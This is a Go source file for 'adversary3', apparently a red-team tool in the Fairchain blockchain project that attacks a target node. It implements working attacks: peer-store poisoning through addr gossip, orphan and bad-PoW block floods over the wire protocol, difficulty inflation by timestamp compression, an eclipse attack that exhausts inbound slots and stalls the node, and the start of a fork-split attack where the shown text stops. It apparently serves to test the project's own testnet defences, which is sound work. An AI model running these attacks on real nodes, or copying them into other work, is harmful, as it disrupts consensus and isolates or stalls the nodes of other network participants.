// Copyright (c) 2024-2026 The Fairchain Contributors
// Distributed under the MIT software license.

package main

import (
	"bytes"
	"crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/bams-repo/fairchain/internal/algorithms"
	"github.com/bams-repo/fairchain/internal/coinparams"
	"github.com/bams-repo/fairchain/internal/crypto"
	"github.com/bams-repo/fairchain/internal/types"
)

var testnetMagic = [4]byte{0xFA, 0x1C, 0xC0, 0x02}

var activeHasher algorithms.Hasher

type result struct {
	Attack  string `json:"attack"`
	Success bool   `json:"success"`
	Detail  string `json:"detail"`
}

func log(format string, args ...interface{}) {
	ts := time.Now().Format("15:04:05.000")
	fmt.Fprintf(os.Stderr, "[%s] %s\n", ts, fmt.Sprintf(format, args...))
}

func logSection(title string) {
	log("")
	log("================================================================")
	log("  %s", title)
	log("================================================================")
}

func logResult(r result) {
	icon := "FAIL"
	if r.Success {
		icon = " OK "
	}
	log("[%s] %s: %s", icon, r.Attack, r.Detail)
}

func main() {
	attack := flag.String("attack", "", "Attack type: seed-poison, fake-blocks-p2p, difficulty-inflate, eclipse-stall, fork-split, headers-lie, full-siege")
	target := flag.String("target", "", "Target node P2P address (ip:port)")
	rpc := flag.String("rpc", "", "Target node RPC address (http://ip:port)")
	poisonAddrs := flag.String("poison-addrs", "", "Comma-separated fake addresses to inject via addr gossip")
	count := flag.Int("count", 50, "Number of iterations/blocks for multi-step attacks")
	flag.Parse()

	if *attack == "" {
		fmt.Fprintln(os.Stderr, "Usage: adversary3 -attack <type> -target <p2p-addr> [-rpc <rpc-addr>] [-poison-addrs <addrs>] [-count <n>]")
		fmt.Fprintln(os.Stderr, "\nAttacks:")
		fmt.Fprintln(os.Stderr, "  seed-poison        Poison peer store with fake/attacker-controlled addresses via addr gossip")
		fmt.Fprintln(os.Stderr, "  fake-blocks-p2p    Inject fake blocks directly over P2P wire protocol (bypass RPC)")
		fmt.Fprintln(os.Stderr, "  difficulty-inflate  Mine timestamp-manipulated chain to inflate difficulty 4x per epoch")
		fmt.Fprintln(os.Stderr, "  eclipse-stall       Eclipse attack: fill inbound slots + poison peer store to isolate node")
		fmt.Fprintln(os.Stderr, "  fork-split          Feed different valid chains to different seed nodes to fork the network")
		fmt.Fprintln(os.Stderr, "  headers-lie         Send fake headers chain claiming massive height to stall sync")
		fmt.Fprintln(os.Stderr, "  full-siege          Run all attacks in sequence (the full testnet assault)")
		os.Exit(1)
	}

	log("adversary3 starting — attack=%s target=%s rpc=%s", *attack, *target, *rpc)

	h, err := algorithms.GetHasher(coinparams.Algorithm)
	if err != nil {
		fmt.Fprintf(os.Stderr, "unsupported PoW algorithm %q: %v\n", coinparams.Algorithm, err)
		os.Exit(1)
	}
	activeHasher = h
	log("PoW hasher: %s", coinparams.Algorithm)

	// Pre-flight: check target reachability
	if *rpc != "" {
		ci, err := fetchChainInfo(*rpc)
		if err != nil {
			log("WARNING: RPC unreachable at %s: %v", *rpc, err)
		} else {
			log("TARGET STATE: chain=%s height=%d bestHash=%s bits=%s", ci.Chain, ci.Height, ci.BestHash[:16], ci.Bits)
		}
	}
	if *target != "" {
		if checkNodeAlive(*target) {
			log("TARGET P2P: %s is reachable", *target)
		} else {
			log("WARNING: P2P target %s is unreachable", *target)
		}
	}

	var results []result

	switch *attack {
	case "seed-poison":
		results = attackSeedPoison(*target, *poisonAddrs, *count)
	case "fake-blocks-p2p":
		results = attackFakeBlocksP2P(*target, *rpc, *count)
	case "difficulty-inflate":
		results = attackDifficultyInflate(*rpc, *count)
	case "eclipse-stall":
		results = attackEclipseStall(*target, *poisonAddrs)
	case "fork-split":
		results = attackForkSplit(*target, *rpc, *count)
	case "headers-lie":
		results = attackHeadersLie(*target, *count)
	case "full-siege":
		results = attackFullSiege(*target, *rpc, *poisonAddrs, *count)
	default:
		fmt.Fprintf(os.Stderr, "Unknown attack: %s\n", *attack)
		os.Exit(1)
	}

	// Summary
	logSection("ATTACK SUMMARY")
	passed := 0
	failed := 0
	for _, r := range results {
		logResult(r)
		if r.Success {
			passed++
		} else {
			failed++
		}
	}
	log("")
	log("Total results: %d | Successful attacks: %d | Failed/Defended: %d", len(results), passed, failed)

	out, _ := json.MarshalIndent(results, "", "  ")
	fmt.Println(string(out))
}

// ============================================================
// Wire protocol helpers
// ============================================================

func doubleSHA256(data []byte) [32]byte {
	first := sha256.Sum256(data)
	return sha256.Sum256(first[:])
}

func writeMessage(conn net.Conn, magic [4]byte, cmd string, payload []byte) error {
	var hdr [24]byte
	copy(hdr[0:4], magic[:])
	var cmdBytes [12]byte
	copy(cmdBytes[:], cmd)
	copy(hdr[4:16], cmdBytes[:])
	binary.LittleEndian.PutUint32(hdr[16:20], uint32(len(payload)))
	checksum := doubleSHA256(payload)
	copy(hdr[20:24], checksum[:4])
	if _, err := conn.Write(hdr[:]); err != nil {
		return err
	}
	if len(payload) > 0 {
		if _, err := conn.Write(payload); err != nil {
			return err
		}
	}
	return nil
}

func readFullMessage(conn net.Conn, timeout time.Duration) (string, []byte, error) {
	conn.SetReadDeadline(time.Now().Add(timeout))
	var hdr [24]byte
	if _, err := io.ReadFull(conn, hdr[:]); err != nil {
		return "", nil, err
	}
	end := 0
	for i := 4; i < 16; i++ {
		if hdr[i] == 0 {
			break
		}
		end = i - 4 + 1
	}
	cmd := string(hdr[4 : 4+end])
	length := binary.LittleEndian.Uint32(hdr[16:20])
	var payload []byte
	if length > 0 {
		if length > 4*1024*1024 {
			return cmd, nil, fmt.Errorf("payload too large: %d", length)
		}
		payload = make([]byte, length)
		if _, err := io.ReadFull(conn, payload); err != nil {
			return cmd, nil, err
		}
	}
	return cmd, payload, nil
}

func doHandshake(conn net.Conn, claimHeight uint32) error {
	conn.SetDeadline(time.Now().Add(15 * time.Second))

	var nonce [8]byte
	rand.Read(nonce[:])

	var vp bytes.Buffer
	binary.Write(&vp, binary.LittleEndian, uint32(5))
	binary.Write(&vp, binary.LittleEndian, uint64(1))
	binary.Write(&vp, binary.LittleEndian, uint64(time.Now().Unix()))
	writeVarString(&vp, conn.RemoteAddr().String())
	writeVarString(&vp, conn.LocalAddr().String())
	vp.Write(nonce[:])
	writeVarString(&vp, "/adversary3:0.1.0/")
	binary.Write(&vp, binary.LittleEndian, claimHeight)

	if err := writeMessage(conn, testnetMagic, "version", vp.Bytes()); err != nil {
		return fmt.Errorf("send version: %w", err)
	}

	cmd, _, err := readFullMessage(conn, 10*time.Second)
	if err != nil {
		return fmt.Errorf("read version: %w", err)
	}
	if cmd != "version" {
		return fmt.Errorf("expected version, got %s", cmd)
	}

	cmd, _, err = readFullMessage(conn, 10*time.Second)
	if err != nil {
		return fmt.Errorf("read verack: %w", err)
	}
	if cmd != "verack" {
		return fmt.Errorf("expected verack, got %s", cmd)
	}

	if err := writeMessage(conn, testnetMagic, "verack", nil); err != nil {
		return fmt.Errorf("send verack: %w", err)
	}

	conn.SetDeadline(time.Time{})
	return nil
}

func writeVarString(w *bytes.Buffer, s string) {
	writeVarInt(w, uint64(len(s)))
	w.WriteString(s)
}

func writeVarInt(w *bytes.Buffer, v uint64) {
	if v < 0xFD {
		w.WriteByte(byte(v))
	} else if v <= 0xFFFF {
		w.WriteByte(0xFD)
		var buf [2]byte
		binary.LittleEndian.PutUint16(buf[:], uint16(v))
		w.Write(buf[:])
	} else if v <= 0xFFFFFFFF {
		w.WriteByte(0xFE)
		var buf [4]byte
		binary.LittleEndian.PutUint32(buf[:], uint32(v))
		w.Write(buf[:])
	} else {
		w.WriteByte(0xFF)
		var buf [8]byte
		binary.LittleEndian.PutUint64(buf[:], v)
		w.Write(buf[:])
	}
}

func writeVarIntRaw(w io.Writer, v uint64) {
	var buf bytes.Buffer
	writeVarInt(&buf, v)
	w.Write(buf.Bytes())
}

// ============================================================
// RPC helpers
// ============================================================

type chainInfo struct {
	Height   int    `json:"blocks"`
	BestHash string `json:"bestblockhash"`
	Bits     string `json:"bits"`
	Chain    string `json:"chain"`
}

type chainStatus struct {
	Bits             string `json:"bits"`
	RetargetInterval uint32 `json:"retarget_interval"`
}

type blockInfo struct {
	Hash      string `json:"hash"`
	Height    int    `json:"height"`
	Version   uint32 `json:"version"`
	PrevBlock string `json:"previousblockhash"`
	Merkle    string `json:"merkleroot"`
	Timestamp uint32 `json:"time"`
	Bits      string `json:"bits"`
	Nonce     uint32 `json:"nonce"`
}

func fetchChainInfo(rpc string) (*chainInfo, error) {
	resp, err := http.Get(fmt.Sprintf("%s/getblockchaininfo", rpc))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	var info chainInfo
	if err := json.NewDecoder(resp.Body).Decode(&info); err != nil {
		return nil, err
	}
	return &info, nil
}

func fetchChainStatus(rpc string) (*chainStatus, error) {
	resp, err := http.Get(fmt.Sprintf("%s/getchainstatus", rpc))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	var status chainStatus
	if err := json.NewDecoder(resp.Body).Decode(&status); err != nil {
		return nil, err
	}
	return &status, nil
}

func fetchBlockByHeight(rpc string, height int) (*blockInfo, error) {
	resp, err := http.Get(fmt.Sprintf("%s/getblockbyheight?height=%d", rpc, height))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	var info blockInfo
	if err := json.NewDecoder(resp.Body).Decode(&info); err != nil {
		return nil, err
	}
	return &info, nil
}

func submitBlock(rpc string, block *types.Block) (bool, string) {
	data, err := block.SerializeToBytes()
	if err != nil {
		return false, fmt.Sprintf("serialize error: %v", err)
	}
	resp, err := http.Post(rpc+"/submitblock", "application/octet-stream", bytes.NewReader(data))
	if err != nil {
		return false, fmt.Sprintf("http error: %v", err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != 200 {
		return true, string(body)
	}
	return false, string(body)
}

// ============================================================
// Block building helpers
// ============================================================

func makeCoinbaseTx(height uint32, value uint64, tag string) types.Transaction {
	// BIP34: encode height with minimal push length
	var heightScript []byte
	switch {
	case height <= 0xFF:
		heightScript = []byte{0x01, byte(height)}
	case height <= 0xFFFF:
		heightScript = []byte{0x02, byte(height), byte(height >> 8)}
	case height <= 0xFFFFFF:
		heightScript = []byte{0x03, byte(height), byte(height >> 8), byte(height >> 16)}
	default:
		heightScript = []byte{0x04, byte(height), byte(height >> 8), byte(height >> 16), byte(height >> 24)}
	}
	scriptSig := append(heightScript, []byte(tag)...)
	return types.Transaction{
		Version: 1,
		Inputs: []types.TxInput{{
			PreviousOutPoint: types.CoinbaseOutPoint,
			SignatureScript:  scriptSig,
			Sequence:         0xFFFFFFFF,
		}},
		Outputs: []types.TxOutput{{
			Value:    value,
			PkScript: []byte{0x00},
		}},
		LockTime: 0,
	}
}

func sealBlock(header *types.BlockHeader, maxIter uint64) bool {
	target := crypto.CompactToHash(header.Bits)
	for i := uint64(0); i < maxIter; i++ {
		hash := activeHasher.PoWHash(header.SerializeToBytes())
		if hash.LessOrEqual(target) {
			return true
		}
		header.Nonce++
		if header.Nonce == 0 {
			return false
		}
	}
	return false
}

func checkNodeAlive(target string) bool {
	if strings.HasPrefix(target, "http") {
		client := &http.Client{Timeout: 5 * time.Second}
		resp, err := client.Get(target + "/getblockchaininfo")
		if err != nil {
			return false
		}
		resp.Body.Close()
		return resp.StatusCode == 200 || resp.StatusCode == 401
	}
	conn, err := net.DialTimeout("tcp", target, 5*time.Second)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

// ============================================================
// ATTACK 1: Seed Node Poisoning via Addr Gossip
// ============================================================
// Connects to the target as a legitimate peer, then floods the addr
// gossip channel with attacker-controlled or nonexistent addresses.
// These get persisted to the target's peer store (peers.dat) and will
// be used for reconnection, effectively poisoning the seed pool.
//
// Impact: New nodes bootstrapping from this seed will connect to
// attacker-controlled nodes or waste time on dead addresses.

func attackSeedPoison(target string, poisonAddrsStr string, count int) []result {
	logSection("ATTACK: Seed Node Poisoning via Addr Gossip")
	if target == "" {
		return []result{{Attack: "seed-poison", Detail: "need -target <p2p-addr>"}}
	}

	var fakeAddrs []string
	if poisonAddrsStr != "" {
		fakeAddrs = strings.Split(poisonAddrsStr, ",")
	} else {
		for i := 0; i < 100; i++ {
			ip := fmt.Sprintf("%d.%d.%d.%d:19334", 10+i/256, 20+(i*7)%256, 30+(i*13)%256, 40+(i*17)%256)
			fakeAddrs = append(fakeAddrs, ip)
		}
	}
	log("Generated %d fake addresses to inject", len(fakeAddrs))
	log("Sample: %s, %s, %s ...", fakeAddrs[0], fakeAddrs[1], fakeAddrs[2])

	var results []result
	totalInjected := 0

	for round := 0; round < count; round++ {
		log("[round %d/%d] Connecting to %s ...", round+1, count, target)
		conn, err := net.DialTimeout("tcp", target, 5*time.Second)
		if err != nil {
			log("[round %d] CONNECT FAILED: %v", round+1, err)
			results = append(results, result{
				Attack: "seed-poison",
				Detail: fmt.Sprintf("round %d: connect failed: %v", round, err),
			})
			time.Sleep(time.Second)
			continue
		}

		if err := doHandshake(conn, 999999); err != nil {
			conn.Close()
			log("[round %d] HANDSHAKE FAILED: %v", round+1, err)
			results = append(results, result{
				Attack: "seed-poison",
				Detail: fmt.Sprintf("round %d: handshake failed: %v", round, err),
			})
			time.Sleep(time.Second)
			continue
		}
		log("[round %d] Handshake OK — sending sendheaders + addr messages", round+1)

		writeMessage(conn, testnetMagic, "sendheaders", nil)

		batchSize := 100
		batches := (len(fakeAddrs) + batchSize - 1) / batchSize
		injectedThisRound := 0

		for b := 0; b < batches; b++ {
			start := b * batchSize
			end := start + batchSize
			if end > len(fakeAddrs) {
				end = len(fakeAddrs)
			}
			batch := fakeAddrs[start:end]

			var payload bytes.Buffer
			writeVarInt(&payload, uint64(len(batch)))
			for _, addr := range batch {
				writeVarString(&payload, addr)
			}

			if err := writeMessage(conn, testnetMagic, "addr", payload.Bytes()); err != nil {
				log("[round %d] addr send error: %v", round+1, err)
				break
			}
			injectedThisRound += len(batch)
			time.Sleep(50 * time.Millisecond)
		}

		totalInjected += injectedThisRound
		log("[round %d] Injected %d addresses (total: %d)", round+1, injectedThisRound, totalInjected)

		time.Sleep(200 * time.Millisecond)
		conn.Close()
	}

	r := result{
		Attack:  "seed-poison",
		Success: totalInjected > 0,
		Detail:  fmt.Sprintf("injected %d fake addresses across %d connections into target peer store", totalInjected, count),
	}
	results = append(results, r)
	logResult(r)

	return results
}

// ============================================================
// ATTACK 2: Fake Block Injection via P2P Wire Protocol
// ============================================================
// Bypasses RPC entirely. Connects as a peer, completes handshake,
// then sends crafted block messages directly over the wire.
// Tests: orphan handling, PoW validation, ban scoring, memory usage.

func attackFakeBlocksP2P(target string, rpc string, count int) []result {
	logSection("ATTACK: Fake Block Injection via P2P Wire Protocol")
	if target == "" {
		return []result{{Attack: "fake-blocks-p2p", Detail: "need -target <p2p-addr>"}}
	}

	var results []result

	log("Connecting to %s ...", target)
	conn, err := net.DialTimeout("tcp", target, 5*time.Second)
	if err != nil {
		return []result{{Attack: "fake-blocks-p2p", Detail: fmt.Sprintf("connect failed: %v", err)}}
	}
	defer conn.Close()

	if err := doHandshake(conn, 999999); err != nil {
		return []result{{Attack: "fake-blocks-p2p", Detail: fmt.Sprintf("handshake failed: %v", err)}}
	}
	log("Handshake OK — starting block injection")

	// Phase 1: Orphan flood via P2P — blocks with random parents
	log("--- Phase 1: Orphan flood (%d blocks with random parents) ---", count/2)
	orphansSent := 0
	for i := 0; i < count/2; i++ {
		var fakeParent types.Hash
		rand.Read(fakeParent[:])

		cb := makeCoinbaseTx(uint32(99999+i), 50_000_000, fmt.Sprintf("orphan-p2p-%d", i))
		block := &types.Block{
			Header: types.BlockHeader{
				Version:   1,
				PrevBlock: fakeParent,
				Timestamp: uint32(time.Now().Unix()),
				Bits:      0x207fffff,
				Nonce:     0,
			},
			Transactions: []types.Transaction{cb},
		}
		merkle, _ := crypto.ComputeMerkleRoot(block.Transactions)
		block.Header.MerkleRoot = merkle

		blockData, _ := block.SerializeToBytes()
		if err := writeMessage(conn, testnetMagic, "block", blockData); err != nil {
			log("  orphan %d: send error: %v", i, err)
			break
		}
		orphansSent++
		if orphansSent%10 == 0 {
			log("  sent %d/%d orphan blocks...", orphansSent, count/2)
		}
	}

	r := result{
		Attack:  "fake-blocks-p2p",
		Success: orphansSent > 0,
		Detail:  fmt.Sprintf("phase 1: sent %d orphan blocks via P2P wire", orphansSent),
	}
	results = append(results, r)
	logResult(r)

	// Phase 2: Blocks with valid parent but wrong PoW
	if rpc != "" {
		log("--- Phase 2: Bad-PoW blocks (valid parent, wrong nonce) ---")
		ci, err := fetchChainInfo(rpc)
		if err == nil {
			prevHash, _ := types.HashFromReverseHex(ci.BestHash)
			var bits uint32
			fmt.Sscanf(ci.Bits, "%x", &bits)
			log("  Building on tip height=%d bits=0x%08x", ci.Height, bits)

			badPowSent := 0
			for i := 0; i < count/2; i++ {
				newHeight := uint32(ci.Height) + 1 + uint32(i)
				cb := makeCoinbaseTx(newHeight, 50_000_000, fmt.Sprintf("badpow-p2p-%d", i))
				block := &types.Block{
					Header: types.BlockHeader{
						Version:   1,
						PrevBlock: prevHash,
						Timestamp: uint32(time.Now().Unix()),
						Bits:      bits,
						Nonce:     0xDEADBEEF,
					},
					Transactions: []types.Transaction{cb},
				}
				merkle, _ := crypto.ComputeMerkleRoot(block.Transactions)
				block.Header.MerkleRoot = merkle

				blockData, _ := block.SerializeToBytes()
				if err := writeMessage(conn, testnetMagic, "block", blockData); err != nil {
					break
				}
				badPowSent++
			}

			r = result{
				Attack:  "fake-blocks-p2p",
				Success: badPowSent > 0,
				Detail:  fmt.Sprintf("phase 2: sent %d bad-PoW blocks via P2P (should trigger ban score)", badPowSent),
			}
			results = append(results, r)
			logResult(r)
		}
	}

	// Phase 3: Blocks with easy bits (wrong difficulty)
	log("--- Phase 3: Easy-bits blocks (wrong difficulty, valid PoW) ---")
	easyBlocksSent := 0
	for i := 0; i < 10; i++ {
		var fakeParent types.Hash
		rand.Read(fakeParent[:])

		cb := makeCoinbaseTx(uint32(50000+i), 50_000_000, fmt.Sprintf("easybits-%d", i))
		block := &types.Block{
			Header: types.BlockHeader{
				Version:   1,
				PrevBlock: fakeParent,
				Timestamp: uint32(time.Now().Unix()),
				Bits:      0x207fffff,
				Nonce:     0,
			},
			Transactions: []types.Transaction{cb},
		}
		merkle, _ := crypto.ComputeMerkleRoot(block.Transactions)
		block.Header.MerkleRoot = merkle

		if sealBlock(&block.Header, 100000) {
			log("  easy-bits block %d: mined OK", i)
		} else {
			log("  easy-bits block %d: PoW not found in 100k iters, sending anyway", i)
		}

		blockData, _ := block.SerializeToBytes()
		if err := writeMessage(conn, testnetMagic, "block", blockData); err != nil {
			log("  easy-bits block %d: send error: %v", i, err)
			break
		}
		easyBlocksSent++
	}

	r = result{
		Attack:  "fake-blocks-p2p",
		Success: easyBlocksSent > 0,
		Detail:  fmt.Sprintf("phase 3: sent %d easy-bits blocks via P2P (wrong difficulty)", easyBlocksSent),
	}
	results = append(results, r)
	logResult(r)

	time.Sleep(2 * time.Second)
	alive := checkNodeAlive(target)
	log("Node alive after fake-blocks attack: %v", alive)
	results = append(results, result{
		Attack:  "fake-blocks-p2p",
		Success: !alive,
		Detail:  fmt.Sprintf("node alive after attack: %v", alive),
	})

	return results
}

// ============================================================
// ATTACK 3: Difficulty Inflation via Timestamp Manipulation
// ============================================================
// Mines a sequence of blocks with compressed timestamps to make the
// retarget algorithm think blocks are being found too fast, causing
// it to increase difficulty. On testnet (20-block retarget, 5s target),
// we compress timestamps to make actualTimespan = targetTimespan/4,
// triggering the maximum 4x difficulty increase per epoch.

func attackDifficultyInflate(rpc string, epochs int) []result {
	logSection("ATTACK: Difficulty Inflation via Timestamp Compression")
	if rpc == "" {
		return []result{{Attack: "difficulty-inflate", Detail: "need -rpc <addr>"}}
	}
	if epochs < 1 {
		epochs = 1
	}
	log("Will attempt %d epoch(s) of difficulty inflation", epochs)

	subsidy := uint64(50_000_000)
	var results []result

	for epoch := 0; epoch < epochs; epoch++ {
		log("--- Epoch %d/%d ---", epoch+1, epochs)
		ci, err := fetchChainInfo(rpc)
		if err != nil {
			log("  ERROR fetching chain info: %v", err)
			results = append(results, result{Attack: "difficulty-inflate", Detail: fmt.Sprintf("epoch %d: %v", epoch, err)})
			continue
		}
		cs, _ := fetchChainStatus(rpc)

		currentHeight := uint32(ci.Height)
		retargetInterval := uint32(20)
		if cs != nil && cs.RetargetInterval > 0 {
			retargetInterval = cs.RetargetInterval
		}

		var bits uint32
		bitsStr := ci.Bits
		if bitsStr == "" && cs != nil {
			bitsStr = cs.Bits
		}
		fmt.Sscanf(bitsStr, "%x", &bits)
		origBits := bits

		nextRetarget := ((currentHeight / retargetInterval) + 1) * retargetInterval
		blocksNeeded := nextRetarget - currentHeight
		if blocksNeeded == 0 {
			blocksNeeded = retargetInterval
			nextRetarget += retargetInterval
		}

		log("  height=%d retarget_interval=%d next_retarget=%d blocks_needed=%d bits=0x%08x",
			currentHeight, retargetInterval, nextRetarget, blocksNeeded, bits)

		accepted := 0
		rejected := 0

		for i := uint32(0); i < blocksNeeded; i++ {
			// Re-fetch tip on each iteration to handle race with honest miner
			// and to get the correct height after any rejections.
			ci2, err2 := fetchChainInfo(rpc)
			if err2 != nil {
				log("  block %d: failed to re-fetch tip: %v", i+1, err2)
				continue
			}
			prevHash2, _ := types.HashFromReverseHex(ci2.BestHash)
			var bits2 uint32
			bitsStr2 := ci2.Bits
			if bitsStr2 == "" {
				cs2, _ := fetchChainStatus(rpc)
				if cs2 != nil {
					bitsStr2 = cs2.Bits
				}
			}
			fmt.Sscanf(bitsStr2, "%x", &bits2)
			newHeight := uint32(ci2.Height) + 1

			// Timestamp strategy for INFLATION: compress timestamps.
			// We want actualTimespan = targetTimespan/4 to trigger max 4x increase.
			// Use timestamp = parent + 1 second (minimum to pass median-time-past).
			tipBlk, _ := fetchBlockByHeight(rpc, ci2.Height)
			blockTimestamp := uint32(time.Now().Unix())
			if tipBlk != nil {
				blockTimestamp = tipBlk.Timestamp + 1
			}

			now := uint32(time.Now().Unix())
			if blockTimestamp > now+120 {
				blockTimestamp = now + 120
			}
			if blockTimestamp < now-120 {
				blockTimestamp = now
			}

			cb := makeCoinbaseTx(newHeight, subsidy, fmt.Sprintf("diff-inflate-e%d-b%d", epoch, i))

			block := &types.Block{
				Header: types.BlockHeader{
					Version:   1,
					PrevBlock: prevHash2,
					Timestamp: blockTimestamp,
					Bits:      bits2,
					Nonce:     0,
				},
				Transactions: []types.Transaction{cb},
			}

			merkle, _ := crypto.ComputeMerkleRoot(block.Transactions)
			block.Header.MerkleRoot = merkle

			mineStart := time.Now()
			if !sealBlock(&block.Header, 500_000_000) {
				log("  block %d/%d: PoW EXHAUSTED (bits=0x%08x, took %v)", i+1, blocksNeeded, bits2, time.Since(mineStart))
				results = append(results, result{
					Attack: "difficulty-inflate",
					Detail: fmt.Sprintf("epoch %d: PoW exhausted at block %d/%d (bits=0x%08x)", epoch, i+1, blocksNeeded, bits2),
				})
				break
			}
			mineTime := time.Since(mineStart)

			wasRejected, detail := submitBlock(rpc, block)
			if wasRejected {
				rejected++
				log("  block %d/%d: REJECTED height=%d (mined in %v): %s", i+1, blocksNeeded, newHeight, mineTime, detail)
				results = append(results, result{
					Attack:  "difficulty-inflate",
					Success: false,
					Detail:  fmt.Sprintf("epoch %d block %d/%d rejected: %s", epoch, i+1, blocksNeeded, detail),
				})
				continue
			}

			accepted++
			blockHash := crypto.HashBlockHeader(&block.Header).ReverseString()
			log("  block %d/%d: ACCEPTED height=%d hash=%s ts=%d bits=0x%08x mined_in=%v",
				i+1, blocksNeeded, newHeight, blockHash[:16], blockTimestamp, bits2, mineTime)

			if newHeight%retargetInterval == 0 {
				time.Sleep(100 * time.Millisecond)
				newCs, csErr := fetchChainStatus(rpc)
				if csErr == nil {
					var newBitsVal uint32
					fmt.Sscanf(newCs.Bits, "%x", &newBitsVal)
					log("  >>> RETARGET at height %d: old_bits=0x%08x new_bits=0x%08x", newHeight, bits, newBitsVal)
					bits = newBitsVal
				}
			}
		}

		time.Sleep(200 * time.Millisecond)
		newCs, _ := fetchChainStatus(rpc)
		newBitsStr := "unknown"
		if newCs != nil {
			newBitsStr = newCs.Bits
		}

		// Check if difficulty actually increased
		var newBits uint32
		fmt.Sscanf(newBitsStr, "%x", &newBits)
		diffIncreased := false
		if newBits != 0 && origBits != 0 {
			oldTarget := crypto.CompactToBig(origBits)
			newTarget := crypto.CompactToBig(newBits)
			diffIncreased = newTarget.Cmp(oldTarget) < 0
		}

		r := result{
			Attack:  "difficulty-inflate",
			Success: diffIncreased,
			Detail: fmt.Sprintf("epoch %d: accepted=%d rejected=%d | old_bits=0x%08x new_bits=%s | difficulty_increased=%v",
				epoch, accepted, rejected, origBits, newBitsStr, diffIncreased),
		}
		results = append(results, r)
		logResult(r)
	}

	return results
}

// ============================================================
// ATTACK 4: Eclipse + Stall Attack
// ============================================================
// Combines connection exhaustion with addr poisoning to isolate
// the target node from the legitimate network.
// 1. Fill all inbound connection slots with attacker connections
// 2. Poison the peer store with attacker-controlled addresses
// 3. Hold connections open but never relay blocks → node stalls

func attackEclipseStall(target string, poisonAddrsStr string) []result {
	logSection("ATTACK: Eclipse + Stall (Connection Exhaustion + Addr Poison)")
	if target == "" {
		return []result{{Attack: "eclipse-stall", Detail: "need -target <p2p-addr>"}}
	}

	var results []result

	// Phase 1: Fill inbound slots
	log("--- Phase 1: Fill inbound connection slots (150 attempts) ---")
	var conns []net.Conn
	var mu sync.Mutex
	var wg sync.WaitGroup
	var connected int32

	for i := 0; i < 150; i++ {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()
			conn, err := net.DialTimeout("tcp", target, 5*time.Second)
			if err != nil {
				return
			}
			if err := doHandshake(conn, 999999); err != nil {
				conn.Close()
				return
			}
			mu.Lock()
			conns = append(conns, conn)
			mu.Unlock()
			atomic.AddInt32(&connected, 1)
		}(i)
	}
	wg.Wait()

	r := result{
		Attack:  "eclipse-stall",
		Success: connected > 50,
		Detail:  fmt.Sprintf("phase 1: established %d inbound connections (filling slots)", connected),
	}
	results = append(results, r)
	logResult(r)

	// Phase 2: Poison peer store via each connection
	log("--- Phase 2: Poison peer store from each connection ---")
	var fakeAddrs []string
	if poisonAddrsStr != "" {
		fakeAddrs = strings.Split(poisonAddrsStr, ",")
	} else {
		for i := 0; i < 50; i++ {
			fakeAddrs = append(fakeAddrs, fmt.Sprintf("%d.%d.%d.%d:19334",
				100+(i*3)%156, 50+(i*7)%206, 10+(i*11)%246, 1+(i*13)%255))
		}
	}

	poisoned := 0
	mu.Lock()
	for _, conn := range conns {
		var payload bytes.Buffer
		writeVarInt(&payload, uint64(len(fakeAddrs)))
		for _, addr := range fakeAddrs {
			writeVarString(&payload, addr)
		}
		if err := writeMessage(conn, testnetMagic, "addr", payload.Bytes()); err == nil {
			poisoned++
		}
	}
	mu.Unlock()

	r = result{
		Attack:  "eclipse-stall",
		Success: poisoned > 0,
		Detail:  fmt.Sprintf("phase 2: poisoned peer store from %d connections (%d fake addrs each)", poisoned, len(fakeAddrs)),
	}
	results = append(results, r)
	logResult(r)

	// Phase 3: Hold connections open, respond to pings but never relay blocks.
	stallDuration := 30 * time.Second
	log("--- Phase 3: Holding %d connections for %v (stalling node — no block relay) ---", len(conns), stallDuration)

	done := make(chan struct{})
	go func() {
		time.Sleep(stallDuration)
		close(done)
	}()

	// Keep connections alive by responding to pings
	mu.Lock()
	for _, conn := range conns {
		go func(c net.Conn) {
			for {
				select {
				case <-done:
					return
				default:
				}
				c.SetReadDeadline(time.Now().Add(2 * time.Second))
				var hdr [24]byte
				if _, err := io.ReadFull(c, hdr[:]); err != nil {
					continue
				}
				end := 0
				for i := 4; i < 16; i++ {
					if hdr[i] == 0 {
						break
					}
					end = i - 4 + 1
				}
				cmd := string(hdr[4 : 4+end])
				length := binary.LittleEndian.Uint32(hdr[16:20])
				if length > 0 && length < 4*1024*1024 {
					payload := make([]byte, length)
					io.ReadFull(c, payload)
				}
				if cmd == "ping" {
					// Echo back as pong to keep alive
					var pongPayload bytes.Buffer
					binary.Write(&pongPayload, binary.LittleEndian, uint64(0))
					writeMessage(c, testnetMagic, "pong", pongPayload.Bytes())
				}
			}
		}(conn)
	}
	mu.Unlock()

	<-done

	results = append(results, result{
		Attack:  "eclipse-stall",
		Success: true,
		Detail:  fmt.Sprintf("phase 3: held %d connections for %v — node received no new blocks", len(conns), stallDuration),
	})

	// Cleanup
	mu.Lock()
	for _, c := range conns {
		c.Close()
	}
	mu.Unlock()

	time.Sleep(2 * time.Second)
	alive := checkNodeAlive(target)
	results = append(results, result{
		Attack:  "eclipse-stall",
		Success: !alive,
		Detail:  fmt.Sprintf("node alive after eclipse: %v", alive),
	})

	return results
}

// ============================================================
// ATTACK 5: Fork Split — Feed Different Chains to Different Nodes
// ============================================================
// Connects to multiple seed nodes and feeds each a different valid
// chain of blocks, attempting to split the network into partitions
// that disagree on the canonical chain.

func attackForkSplit(target string, rpc string, count int) []result {
	logSection("ATTACK: Fork Split (Competing Chains to Different Nodes)")
	if rpc == "" {
		return []result{{Attack: "fork-split", Detail: "need -rpc <addr>"}}
	}

	targets := strings.Split(target, ",")
	if len(targets) < 1 {
		return []result{{Attack: "fork-split", Detail: "need at least 1 target"}}
	}
	log("Targets: %v", targets)

	var results []result
	subsidy := uint64(50_000_000)

	ci, err := fetchChainInfo(rpc)
	if err != nil {
		return []result{{Attack: "fork-split", Detail: fmt.Sprintf("fetch chain info: %v", err)}}
	}

	prevHash, _ := types.HashFromReverseHex(ci.BestHash)
	var bits uint32
